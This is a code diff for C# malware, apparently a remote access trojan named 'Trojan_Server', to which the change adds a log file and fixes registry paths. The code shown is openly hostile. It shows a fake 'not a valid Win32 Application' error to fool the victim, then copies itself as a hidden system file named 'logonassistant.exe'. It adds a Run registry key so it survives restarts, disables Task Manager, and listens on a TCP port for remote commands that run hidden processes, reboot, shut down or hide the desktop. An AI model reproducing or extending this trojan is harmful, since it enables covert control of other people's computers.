@@ -56,6 +56,7 @@ namespace Trojan_Server
                         case "MESSAGE":
                             string Msg = CommandArray[1];
                             System.Windows.Forms.MessageBox.Show(Msg.Trim('\0'));
+                            Log("Sent Command Message with Message " + Msg.Trim('\0') , "COMMAND");
                             break;
                         case "OPENSITE":
                             string Site = CommandArray[1];
@@ -64,6 +65,7 @@ namespace Trojan_Server
                             IE.StartInfo.Arguments = Site.Trim('\0');
                             IE.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
                             IE.Start();
+                            Log("Opend Website:" + Site.Trim('\0') , "COMMAND");
                             break;
                         case "REBOOT":
                             string RebootTime = CommandArray[1];
@@ -72,6 +74,7 @@ namespace Trojan_Server
                             reboot.StartInfo.Arguments = "-r -t " + RebootTime.Trim('\0');
                             reboot.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                             reboot.Start();
+                            Log("System Restarted after " +RebootTime.Trim('\0') + "s !" , "COMMAND");
                             break;
                         case "SHUTDOWN":
                             string ShutdownTime = CommandArray[1];
@@ -80,6 +83,7 @@ namespace Trojan_Server
                             shutdown.StartInfo.Arguments = "-s -t " + ShutdownTime.Trim('\0');
                             shutdown.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                             shutdown.Start();
+                            Log("System Shutdown after " +ShutdownTime.Trim('\0') + "s !" , "COMMAND");
                             break;
                         case "LOGOFF":
                             System.Diagnostics.Process logoff = new System.Diagnostics.Process();
@@ -87,6 +91,7 @@ namespace Trojan_Server
                             logoff.StartInfo.Arguments = "/l";
                             logoff.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                             logoff.Start();
+                            Log("Logoff done!", "COMMAND");
                             break;
                         case "CMDCOMMAND":
                             string CMDCommnd = CommandArray[1];
@@ -94,22 +99,27 @@ namespace Trojan_Server
                             Cmd.StartInfo.FileName = CMDCommnd.Trim('\0');
                             Cmd.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                             Cmd.Start();
+                            Log("Runned Command: " + CMDCommnd.Trim('\0') , "COMMAND");
                             break;
                         case "HIDETASKBAR":
                             int TaskBarHwnd;
                             TaskBarHwnd = FindWindow("Shell_traywnd", "");
                             SetWindowPos(TaskBarHwnd, 0, 0, 0, 0, 0, SWP_HIDEWINDOW);
+                            Log("Hide Taskbar!", "COMMAND");
                             break;
                         case "SHOWTASKBAR":
                             int TaskBarHwnds;
                             TaskBarHwnds = FindWindow("Shell_traywnd", "");
                             SetWindowPos(TaskBarHwnds, 0, 0, 0, 0, 0, SWP_SHOWWINDOW);
+                            Log("Show Taskbar!", "COMMAND");
                             break;
                         case "HIDEDESKTOPICONS":
                             ShowWindow(FindWindow("Progman", "Program Manager"), 0);
+                            Log("Hide Desktop!", "COMMAND");
                             break;
                         case "SHOWDESKTOPICONS":
                             ShowWindow(FindWindow("Progman", "Program Manager"), 1);
+                            Log("Show Desktop!", "COMMAND");
                             break;
 						case "HIDETASKMANGER":
                             ShowWindow(FindWindow("taskmgr", "Task Manager"), 0);
@@ -129,14 +139,19 @@ namespace Trojan_Server
         public static bool CheckIfRan()
         {
             bool IsRan = false;
+            Log("RAT Starting Up!...", "ALWAYS");
+            Log("龴ↀ◡ↀ龴", "ALWAYS");
+            Log("Checking If Startup is already done!", "ALWAYS");
             if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe")) { 
                 RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                 if (k.GetValue("logonassist") != null)
                 {
+                	Log("Startup is already done!", "DEBUG");
                     IsRan = true;
                 }
                 else
                 {
+                	Log("Trying to add to Startup!", "DEBUG");
                     IsRan = false;
                 }
             }
@@ -146,37 +161,73 @@ namespace Trojan_Server
         {
             try
             {
+            	Log("Trying to Copy File to C:/Windows/SystemWOW64/logonassistant.exe", "DEBUG");
                 File.Copy(Convert.ToString(System.Reflection.Assembly.GetExecutingAssembly().Location), Convert.ToString(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe"), true);
+                Log("Found System Folder: C:/Windows/SystemWOW64", "DEBUG");
+                Log("File Copied to System Directory: C:/Windows/SystemWOW64/logonassistant.exe", "DEBUG");
+                Log("Trying change File Attributes", "DEBUG");
                 File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.Hidden);
                 File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.System);
                 File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.ReadOnly);
+                Log("File made to System, Hidden and Readonly!", "DEBUG");
+                Log("Trying to make Startup Key!", "DEBUG");
                 RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
-                k.SetValue("logonassist", Environment.GetFolderPath(Environment.SpecialFolder.System) + "logonassistant.exe", RegistryValueKind.String);
+                k.SetValue("logonassist", Environment.GetFolderPath(Environment.SpecialFolder.System) + " \\logonassistant.exe", RegistryValueKind.String);
                 k.Close();
-                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\Windows\CurrentVersion\Policies\System");
+                Log("Startup RegistryKey angelegt!", "DEBUG");
+                Log("Trying to make DisableTaskMgr Key", "DEBUG");
+                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                 objRegistryKey.SetValue("DisableTaskMgr", "1");
                 objRegistryKey.Close();
+                Log("DisableTaskMgr enabled!", "DEBUG");
             }
             catch
             {
-				System.Windows.Forms.MessageBox.Show("Error while Adding to Startup...", "Error", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
+            	Log("Error while Adding to Startup!", "ERROR");
             }
             
         }
-
+		
+        public static string GetTempPath()
+        {
+        	string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+        	if (!path.EndsWith("\\")) path += "\\";
+        	return path;
+        }
+        
+        public static void Log(string msg, string art)
+        {
+        	System.IO.StreamWriter sw = System.IO.File.AppendText(
+        		GetTempPath() + "RATLog.txt");
+        	try
+        	{
+        		string logLine = System.String.Format(
+        			"{0:G}: {1}: {2} ", System.DateTime.Now, art, msg);
+        		sw.WriteLine(logLine);
+        	}
+        	finally 
+        	{
+        		sw.Close();
+        	}
+        }
         static void Main(string[] args)
         {
             FreeConsole();
+            Log("Deleting old Log!" , "ALWAYS");
+            File.Delete(GetTempPath() + "RATLog.txt");
             bool Check = CheckIfRan();
             if (!Check)
             {
                 System.Windows.Forms.MessageBox.Show("This Programm is not a valid Win32 Application!", "Error", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
+                Log("Showed Fake Messaage!" , "ALWAYS");
                 AddToStartup();
                 TcpListener l = new TcpListener(2000);
                 l.Start();
+                Log("Started TcpListener..." , "ALWAYS");
                 TcpClient Connection = l.AcceptTcpClient();
                 Reciver = Connection.GetStream();
                 System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Recive));
+                Log("Started Reciver!" , "ALWAYS");
                 Rec.Start();
             }
         }
